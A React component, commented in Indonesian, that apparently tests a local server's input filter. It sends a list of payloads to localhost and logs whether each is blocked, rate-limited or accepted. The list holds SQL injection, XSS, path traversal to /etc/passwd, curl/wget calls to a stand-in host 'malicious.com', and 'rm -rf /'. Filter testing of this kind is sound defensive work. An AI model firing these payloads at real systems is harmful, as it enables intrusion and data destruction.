import React from "react";

const BadRequestTester: React.FC = () => {
  const payloads = [
    // SQL Injection
    "' OR '1'='1",
    "UNION SELECT * FROM users",
    "SELECT * FROM admin WHERE 'a'='a",
    "DROP TABLE users",

    // XSS
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",

    // Path Traversal
    "../../etc/passwd",
    "..\\..\\windows\\system.ini",

    // Command Injection
    "curl http://malicious.com",
    "wget http://malicious.com",
    "exec('rm -rf /')",
  ];

  const handleBadRequestTest = () => {
    payloads.forEach((payload, i) => {
      fetch("http://localhost:8080/endpoint.go", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "User-Agent": payload, // Bisa juga inject ke User-Agent
        },
        body: JSON.stringify({
          nama: `Faizh ${i}`,
          pesan: payload,
        }),
      })
        .then((res) => {
          if (res.status === 403) {
            console.warn(`🛑 [${i}] DIBLOKIR (403): Pola mencurigakan terdeteksi`);
          } else if (res.status === 429) {
            console.warn(`❌ [${i}] RATE LIMIT`);
          } else {
            console.log(`✅ [${i}] Diterima:`, res.status);
          }
        })
        .catch((err) => {
          console.error(`🔥 [${i}] Gagal:`, err);
        });
    });
  };

  return (
    <div className="p-4">
      <button
        onClick={handleBadRequestTest}
        className="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700 transition"
      >
        Tes Serangan Berbahaya 💣
      </button>
    </div>
  );
};

export default BadRequestTester;
